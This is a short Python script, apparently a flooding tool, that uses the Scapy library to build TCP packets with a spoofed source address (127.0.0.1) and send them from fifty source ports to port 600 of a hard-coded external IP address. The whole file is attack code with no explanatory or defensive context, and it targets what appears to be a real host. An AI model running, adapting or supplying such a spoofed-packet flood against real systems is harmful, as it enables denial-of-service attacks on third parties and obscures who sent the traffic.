from scapy.all import *
from scapy.layers.inet import TCP, IP

def floodz(source, target):
    for source_p in range(100, 150):
        IPlayer = IP(src=source, dst=target)
        TCPlayer = TCP(sport=source_p, dport=600)
        pkt = IPlayer/TCPlayer
        send(pkt)

source = "127.0.0.1"
target = "111.65.250.2"
floodz(source, target)